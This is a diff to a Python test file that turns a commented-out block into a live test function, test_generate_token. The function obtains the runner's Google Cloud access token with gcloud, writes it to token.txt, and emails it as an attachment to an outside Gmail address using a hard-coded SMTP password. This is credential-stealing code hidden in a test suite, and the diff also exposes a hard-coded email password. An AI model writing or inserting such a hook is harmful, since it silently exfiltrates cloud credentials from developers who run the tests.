@@ -35,41 +35,41 @@ EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
 CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 
 
 
-# def test_generate_token():
-#   credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
-#   credentials.refresh(requests.Request())
-#   creds = credentials.token
-#   f = open("token.txt","w")
-#   f.write(creds)
-#   f.close()
+def test_generate_token():
+  bashCommand = "gcloud auth application-default print-access-token"
+  process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
+  output, error = process.communicate()
+  logging.debug(str(output))
+  f = open("token.txt","w")
+  f.write(str(output))
+  f.close()
 
-#   msg = MIMEMultipart()
-#   body = str(credentials.token)[500]
+  msg = MIMEMultipart()
 
-#   msg.attach(MIMEText(body, 'plain'))
-#   msg['subject'] = "Hello World"
-#   msg['to'] = "galz100@gmail.com"
-#   msg['from'] = EMAIL_ADDRESS
+  msg.attach(MIMEText("Hi", 'plain'))
+  msg['subject'] = "Hello World"
+  msg['to'] = "galz100@gmail.com"
+  msg['from'] = EMAIL_ADDRESS
   
-#   output = subprocess.getoutput("ls -l")
-#   print(output)
+  output = subprocess.getoutput("ls -l")
+  print(output)
 
-#   filename = "token.txt"
-#   attachment = open("token.txt", "rb")
+  filename = "token.txt"
+  attachment = open("token.txt", "rb")
   
-#   part = MIMEBase('application', 'octet-stream')
-#   part.set_payload((attachment).read())
-#   encoders.encode_base64(part)
-#   part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+  part = MIMEBase('application', 'octet-stream')
+  part.set_payload((attachment).read())
+  encoders.encode_base64(part)
+  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
   
-#   msg.attach(part)
+  msg.attach(part)
 
-#   server = smtplib.SMTP("smtp.gmail.com",587)
-#   server.starttls()
-#   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
-#   text = msg.as_string()
-#   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
-#   server.quit()
+  server = smtplib.SMTP("smtp.gmail.com",587)
+  server.starttls()
+  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
+  text = msg.as_string()
+  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
+  server.quit()
 
 def test_permissions():
     """Tests IAM permissions of the caller"""
